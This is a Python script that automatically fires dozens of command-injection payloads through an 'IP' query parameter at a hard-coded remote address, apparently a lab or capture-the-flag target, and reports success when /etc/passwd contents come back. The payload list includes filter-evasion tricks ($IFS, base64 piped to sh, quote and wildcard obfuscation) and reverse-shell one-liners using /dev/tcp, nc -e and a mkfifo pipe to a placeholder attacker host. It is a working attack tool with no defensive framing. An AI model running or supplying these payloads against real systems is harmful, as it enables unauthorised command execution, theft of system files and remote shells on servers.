import requests

# Target URL
BASE_URL = "http://135.181.88.229:54677/"

# List of payloads to test
PAYLOADS = [
    # Basic Command Injection
    "127.0.0.1;cat /etc/passwd",
    "127.0.0.1&&cat /etc/passwd",
    "127.0.0.1|cat /etc/passwd",
    "127.0.0.1||cat /etc/passwd",
    "127.0.0.1`cat /etc/passwd`",
    "127.0.0.1$(cat /etc/passwd)",
    "127.0.0.1${IFS}&&${IFS}cat${IFS}/etc/passwd",
    "127.0.0.1%3Bcat%20/etc/passwd",  # URL-encoded ;
    "127.0.0.1%26%26cat%20/etc/passwd",  # URL-encoded &&
    "127.0.0.1%7Ccat%20/etc/passwd",  # URL-encoded |
    "127.0.0.1%7C%7Ccat%20/etc/passwd",  # URL-encoded ||

    # Base64 Encoding
    "127.0.0.1;echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh",
    "127.0.0.1;echo cGFzc3dk | base64 -d | xargs cat",
    "127.0.0.1;echo bHMgfCBiYXNo | base64 -d | sh",

    # Alternative Shells
    "127.0.0.1;bash -c 'cat /etc/passwd'",
    "127.0.0.1;sh -c 'cat /etc/passwd'",
    "127.0.0.1;perl -e 'print `cat /etc/passwd`'",
    "127.0.0.1;python -c 'print(open(\"/etc/passwd\").read())'",
    "127.0.0.1;ruby -e 'puts File.read(\"/etc/passwd\")'",

    # Wildcards and Path Manipulation
    "127.0.0.1;cat /???/passwd",
    "127.0.0.1;cat /e*/p*",
    "127.0.0.1;cat ././etc/passwd",
    "127.0.0.1;cat /{e,t,c}/passwd",

    # Using $IFS (Internal Field Separator)
    "127.0.0.1;cat$IFS/etc/passwd",
    "127.0.0.1${IFS}&&${IFS}cat${IFS}/etc/passwd",
    "127.0.0.1;cat${IFS}/etc/passwd",
    "127.0.0.1;cat$IFS$9/etc/passwd",  # $9 is empty in most shells

    # Command Substitution
    "127.0.0.1;$(cat /etc/passwd)",
    "127.0.0.1;`cat /etc/passwd`",
    "127.0.0.1;$(echo cat /etc/passwd)",
    "127.0.0.1;`echo cat /etc/passwd`",

    # Chaining Commands
    "127.0.0.1;{cat,/etc/passwd}",
    "127.0.0.1;[cat,/etc/passwd]",
    "127.0.0.1;cat</etc/passwd",
    "127.0.0.1;cat>/tmp/out;cat /tmp/out",

    # IPv6 Addresses
    "::1;cat /etc/passwd",
    "::1&&cat /etc/passwd",
    "::1|cat /etc/passwd",
    "::1||cat /etc/passwd",

    # Obfuscated Commands
    "127.0.0.1;c''at /e''tc/pa''sswd",
    "127.0.0.1;ca$@t /et$c/pa$$sswd",
    "127.0.0.1;cat$u /etc/passwd",
    "127.0.0.1;cat$@ /etc/passwd",

    # Using Backticks with Variables
    "127.0.0.1;CMD=cat;FILE=/etc/passwd;$CMD $FILE",
    "127.0.0.1;`echo cat` /etc/passwd",

    # Custom Delimiters
    "127.0.0.1;cat<<EOF\n/etc/passwd\nEOF",
    "127.0.0.1;cat<<'EOF'\n/etc/passwd\nEOF",

    # Reverse Shell Payloads
    "127.0.0.1;bash -i >& /dev/tcp/<your-ip>/<port> 0>&1",
    "127.0.0.1;nc -e /bin/sh <your-ip> <port>",
    "127.0.0.1;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your-ip> <port> >/tmp/f",

    # Miscellaneous
    "127.0.0.1;cat /etc/passwd #",
    "127.0.0.1;cat /etc/passwd &",
    "127.0.0.1;cat /etc/passwd && ls",
    "127.0.0.1;cat /etc/passwd | grep root",
    "127.0.0.1;cat /etc/passwd || ls",
    "127.0.0.1;cat /etc/passwd; ls",
    "127.0.0.1;cat /etc/passwd\nls",
    "127.0.0.1;cat%20/etc/passwd",
    "127.0.0.1;echo $(cat /etc/passwd)",
    "127.0.0.1;echo `cat /etc/passwd`",
    "127.0.0.1;echo -e \"\\x63\\x61\\x74 /etc/passwd\"",
]

# Function to test payloads
def test_payloads():
    for payload in PAYLOADS:
        # Construct the full URL
        url = f"{BASE_URL}?IP={payload}"
        
        try:
            # Send the request
            response = requests.get(url, timeout=5)
            
            # Check if the response contains the matcher "root:x:0:0"
            if "root:x:0:0" in response.text:
                print(f"[+] Success! Payload worked: {url}")
                return
            
            # Print progress
            print(f"[-] Failed: {url}")
        
        except Exception as e:
            print(f"[!] Error with payload {payload}: {e}")

# Run the script
if __name__ == "__main__":
    test_payloads()
